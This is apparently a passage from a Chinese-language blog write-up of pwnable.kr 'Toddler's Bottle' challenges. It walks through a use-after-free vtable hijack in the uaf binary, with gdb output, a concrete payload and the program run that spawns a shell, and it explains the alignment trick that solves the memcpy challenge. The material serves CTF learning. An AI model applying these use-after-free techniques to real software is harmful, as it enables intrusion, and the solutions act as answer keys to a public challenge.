</span></span><span class=line><span class=cl>                <span class=n>len</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>char</span><span class=p>[</span><span class=n>len</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>read</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>),</span> <span class=n>data</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;your data is allocated&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=k>delete</span> <span class=n>m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>delete</span> <span class=n>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>本题最终肯定是要调用 <code>Human</code> 的 <code>give_shell</code> 函数，但程序不会直接调用。程序共有三种操作：</p><ul><li><code>use</code>: 调用 <code>Man</code> 和 <code>Woman</code> 对象的 <code>introduce</code> 函数</li><li><code>after</code>: 从 <code>argv[2]</code> 中读取长为 <code>argv[1]</code> 的数据，放到 <code>data</code> 中</li><li><code>free</code>: 释放 <code>Man</code> 和 <code>Woman</code> 对象的指针</li></ul><p>我们这里可以猜想是要将 <code>introduce</code> 函数劫持到 <code>give_shell</code> 上，但是具体怎么做？注意到 <code>give_shell</code> 和 <code>introduce</code> 都是被继承的虚函数，能不能通过改变函数虚表地址来劫持函数呢？</p><p>首先我们尝试找到 <code>Man</code> 的虚函数表。在 <code>main</code> 中找到 <code>Man</code> 构造函数的地址：</p><p><figure><img class="my-0 rounded-md" srcset="/posts/pwnkr-toddler/1_hucfeb40fe479d863c947b67be5bf3a980_13599_330x0_resize_box_3.png 330w,
/posts/pwnkr-toddler/1_hucfeb40fe479d863c947b67be5bf3a980_13599_660x0_resize_box_3.png 660w,
/posts/pwnkr-toddler/1_hucfeb40fe479d863c947b67be5bf3a980_13599_1024x0_resize_box_3.png 1024w,
/posts/pwnkr-toddler/1_hucfeb40fe479d863c947b67be5bf3a980_13599_1320x0_resize_box_3.png 2x" src=/posts/pwnkr-toddler/1_hucfeb40fe479d863c947b67be5bf3a980_13599_660x0_resize_box_3.png alt="图 1"></figure></p><p>注意到对象被放到 <code>rbx</code> 里，我们在构造函数执行后下断点，可以查看 <code>Man</code> 的对象：</p><pre tabindex=0><code>(gdb) b *0x400f18
(gdb) c
(gdb) p/x $rbx
$1 = 0x1fe8c50
(gdb) x/8 0x1fe8c50
0x1fe8c50:    0x00401570    0x00000000    0x00000019    0x00000000
0x1fe8c60:    0x01fe8c38    0x00000000    0x000203a1    0x00000000
</code></pre><p>由于虚函数表地址在对象首部，所以这里虚函数表地址就是 <code>0x401570</code>。我们继续看虚函数表：</p><pre tabindex=0><code>(gdb) x/8a 0x401570
0x401570 &lt;_ZTV3Man+16&gt;:    0x40117a &lt;_ZN5Human10give_shellEv&gt;    0x4012d2 &lt;_ZN3Man9introduceEv&gt;
0x401580 &lt;_ZTV5Human&gt;:    0x0    0x4015f0 &lt;_ZTI5Human&gt;
0x401590 &lt;_ZTV5Human+16&gt;:    0x40117a &lt;_ZN5Human10give_shellEv&gt;    0x401192 &lt;_ZN5Human9introduceEv&gt;
0x4015a0 &lt;_ZTS5Woman&gt;:    0x6e616d6f5735    0x0
</code></pre><p>用 <code>a</code> 可以把函数名显示出来，可以看到 <code>Man</code> 和 <code>Human</code> 的 <code>give_shell</code> 虚函数地址相同，而 <code>introduce</code> 不同，这是符合 C++ 虚函数机制的：私有虚函数不能被继承，但是会在子类的虚函数表中出现。换句话说，子类调用的本质上还是父类的虚函数。</p><p>接下来用 IDA 分析，可以看到输入 <code>1</code> 的时候执行：</p><p><figure><img class="my-0 rounded-md" srcset="/posts/pwnkr-toddler/2_hu2df8ab0eedbff0823a447d0319da6c9f_4032_330x0_resize_box_3.png 330w,
/posts/pwnkr-toddler/2_hu2df8ab0eedbff0823a447d0319da6c9f_4032_660x0_resize_box_3.png 660w,
/posts/pwnkr-toddler/2_hu2df8ab0eedbff0823a447d0319da6c9f_4032_1024x0_resize_box_3.png 1024w,
/posts/pwnkr-toddler/2_hu2df8ab0eedbff0823a447d0319da6c9f_4032_1320x0_resize_box_3.png 2x" src=/posts/pwnkr-toddler/2_hu2df8ab0eedbff0823a447d0319da6c9f_4032_660x0_resize_box_3.png alt="图 2"></figure></p><p>也就是两个 <code>introduce</code>，那么这里的 <code>v12</code> 和 <code>v13</code> 就可以确定是对应于 <code>m</code> 和 <code>w</code> 的虚指针了，之后转换为指针再 + 8，正好就是调用 <code>vtable + 8</code> 处的函数即 <code>introduce</code>。那么如果我们想让它执行位于 <code>vtable + 0</code> 的 <code>give_shell</code>，只需要在这句执行前让 <code>vtable</code> 的值减少 8 就行了。</p><p>而我们前面已经读到了 <code>vtable</code> 的值 <code>0x401570</code>，减 8 就是 <code>0x401568</code>。</p><p>说了这么多，怎么利用 <code>use</code>、<code>after</code> 和 <code>free</code> 三个过程来修改 <code>vtable</code> 值呢？我们知道，对于一块 <code>free</code> 操作释放掉的内存，仍然可能存在一个指针是指向它的，这个指针一般被称作悬空指针 <code>dangling pointer</code>。在这里，<code>m</code> 和 <code>w</code> 就属于悬空指针。</p><p>如果在这时，我们调用 <code>after</code> 过程，即分配一个<strong>等长</strong>的内存区域给 <code>data</code>，那么 <code>w</code> 所指的内存区域就会被分配。如果再次 <code>after</code>，那么 <code>m</code> 所指的内存区域也会被分配，这是由 <code>new/malloc</code> 的性质决定的。</p><p>现在，假如我们给 <code>data</code> 写入的是 <code>0x401568</code>，并且调用 <code>use</code> 过程，那么就会执行 <code>m->introduce()</code>，这会访问到 <code>0x401568 + 8 = 0x401570</code> 处的函数指针，恰好是 <code>m</code> 的 <code>vtable + 0</code> 处，也就变成了 <code>m->give_shell()</code>。</p><p>那么只剩下一个问题了，就是我们要分配多大的空间给 <code>data</code>，这在 IDA 中很容易发现：</p><p><figure><img class="my-0 rounded-md" srcset="/posts/pwnkr-toddler/3_hu9509258889fed9940359934791062854_6147_330x0_resize_box_3.png 330w,
/posts/pwnkr-toddler/3_hu9509258889fed9940359934791062854_6147_660x0_resize_box_3.png 660w,
/posts/pwnkr-toddler/3_hu9509258889fed9940359934791062854_6147_1024x0_resize_box_3.png 1024w,
/posts/pwnkr-toddler/3_hu9509258889fed9940359934791062854_6147_1320x0_resize_box_3.png 2x" src=/posts/pwnkr-toddler/3_hu9509258889fed9940359934791062854_6147_660x0_resize_box_3.png alt="图 3"></figure></p><p><code>0x18</code> 字节，也就是 24 字节。最终 payload（注意地址是三十二位的）：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python -c <span class=s1>&#39;print&#34;\x68\x15\x40&#34;+&#34;\x00&#34;*5&#39;</span> &gt; /tmp/payload
</span></span><span class=line><span class=cl>$ ./uaf <span class=m>24</span> /tmp/payload
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>3</span>
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>2</span>
</span></span><span class=line><span class=cl>your data is allocated
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>2</span>
</span></span><span class=line><span class=cl>your data is allocated
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>1</span>
</span></span></code></pre></div><h2 id=memcpy class="relative group">memcpy <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#memcpy aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// compiled with : gcc -o memcpy memcpy.c -m32 -lm
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;math.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=nf>rdtsc</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>asm</span><span class=p>(</span><span class=s>&#34;rdtsc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=nf>slow_memcpy</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>src</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=nf>fast_memcpy</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 64-byte block fast copy
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>len</span><span class=o>&gt;=</span> <span class=mi>64</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=n>len</span> <span class=o>/</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>&amp;=</span> <span class=p>(</span><span class=mi>64</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=n>i</span><span class=o>--&gt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=n>__asm__</span> <span class=nf>__volatile__</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movdqa (%0), %%xmm0</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movdqa 16(%0), %%xmm1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movdqa 32(%0), %%xmm2</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movdqa 48(%0), %%xmm3</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movntps %%xmm0, (%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movntps %%xmm1, 16(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movntps %%xmm2, 32(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;movntps %%xmm3, 48(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>::</span><span class=s>&#34;r&#34;</span><span class=p>(</span><span class=n>src</span><span class=p>),</span><span class=s>&#34;r&#34;</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=o>:</span><span class=s>&#34;memory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>dest</span> <span class=o>+=</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>+=</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// byte-to-byte slow copy
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>len</span><span class=p>)</span> <span class=nf>slow_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IOLBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hey, I have a boring assignment for CS class.. :(</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The assignment is simple.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;-----------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- What is the best implementation of memcpy?        -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- 1. implement your own slow/fast version of memcpy -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- 2. compare them with various size of data         -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- 3. conclude your experiment and submit report     -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;-----------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;This time, just help me out with my experiment and get flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;No fancy hacking, I promise :D</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>t1</span><span class=p>,</span> <span class=n>t2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>low</span><span class=p>,</span> <span class=n>high</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// allocate memory
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span><span class=o>*</span> <span class=n>cache1</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>cache2</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>sizes</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// setup experiment parameters
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span><span class=p>(</span><span class=n>e</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span> <span class=n>e</span><span class=o>&lt;</span><span class=mi>14</span><span class=p>;</span> <span class=n>e</span><span class=o>++</span><span class=p>){</span>    <span class=c1>// 2^13 = 8K
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>low</span> <span class=o>=</span> <span class=nf>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>e</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>high</span> <span class=o>=</span> <span class=nf>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>e</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;specify the memcpy amount between %d ~ %d :&#34;</span><span class=p>,</span> <span class=n>low</span><span class=p>,</span> <span class=n>high</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>low</span> <span class=o>||</span> <span class=n>size</span><span class=o>&gt;</span> <span class=n>high</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;don&#39;t mess with the experiment.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>sizes</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ok, lets run the experiment with your configuration</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// run experiment
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>10</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>=</span> <span class=n>sizes</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;experiment %d : memcpy with buffer size %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>cache1</span><span class=p>,</span> <span class=n>cache2</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>);</span>        <span class=c1>// to eliminate cache effect
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>t1</span> <span class=o>=</span> <span class=nf>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>slow_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>        <span class=c1>// byte-to-byte memcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>t2</span> <span class=o>=</span> <span class=nf>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ellapsed CPU cycles for slow_memcpy : %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>t2</span><span class=o>-</span><span class=n>t1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>cache1</span><span class=p>,</span> <span class=n>cache2</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>);</span>        <span class=c1>// to eliminate cache effect
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>t1</span> <span class=o>=</span> <span class=nf>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>fast_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>        <span class=c1>// block-to-block memcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>t2</span> <span class=o>=</span> <span class=nf>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ellapsed CPU cycles for fast_memcpy : %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>t2</span><span class=o>-</span><span class=n>t1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;thanks for helping my experiment!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;flag : ----- erased in this source code -----</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>本题实现了一个针对 64 字节以上的块的快速 <code>memcpy</code> 方法，使用的是 <code>movdqa</code> 和 <code>movntps</code> 两个汇编指令。但是实际运行时，即使按要求输入合法数据，程序也会崩溃。查了 <a href=https://www.felixcloutier.com/x86/movntps>一些资料</a> 后，发现是由于堆分配时字节没有对齐导致的：</p><blockquote><p>The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p></blockquote><p>显然这里是要求目的地址是 16 字节对齐的，换句话说它的十六进制末尾是 0。gdb 调试一下，全部输入最小的合法数据：</p><p><figure><img class="my-0 rounded-md" srcset="/posts/pwnkr-toddler/4_hu7e0ae947bc894b68126f960ba2320964_126170_330x0_resize_box_3.png 330w,
/posts/pwnkr-toddler/4_hu7e0ae947bc894b68126f960ba2320964_126170_660x0_resize_box_3.png 660w,
/posts/pwnkr-toddler/4_hu7e0ae947bc894b68126f960ba2320964_126170_1024x0_resize_box_3.png 1024w,
/posts/pwnkr-toddler/4_hu7e0ae947bc894b68126f960ba2320964_126170_1320x0_resize_box_3.png 2x" src=/posts/pwnkr-toddler/4_hu7e0ae947bc894b68126f960ba2320964_126170_660x0_resize_box_3.png alt="图 4"></figure></p><p>可以看到段错误的时候，目的寄存器 <code>edx</code> 的末尾并不是 0，因此产生了错误。这不难理解：<code>malloc</code> 进行堆分配时，对于 <code>8</code> 而言分配了 <code>0x8+0x8=0x10</code> 字节，是对齐的；对 <code>16</code> 而言分配了 <code>0x8+0x10=0x18</code> 字节，于是不对齐了，我们可以给它 + 8 来对齐。对于 <code>32</code>，分配 <code>0x8+0x20=0x28</code> 字节，同样不对齐，我们也作同样的 padding 处理，于是我们可以输入数据：</p><pre tabindex=0><code>8 24 40 72 136 264 520 1032 2056 4104
</code></pre><p>使得每次 <code>edx</code> 都是对齐的，程序就不会段错误了，最终得到 flag。</p><h2 id=asm class="relative group">asm <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#asm aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
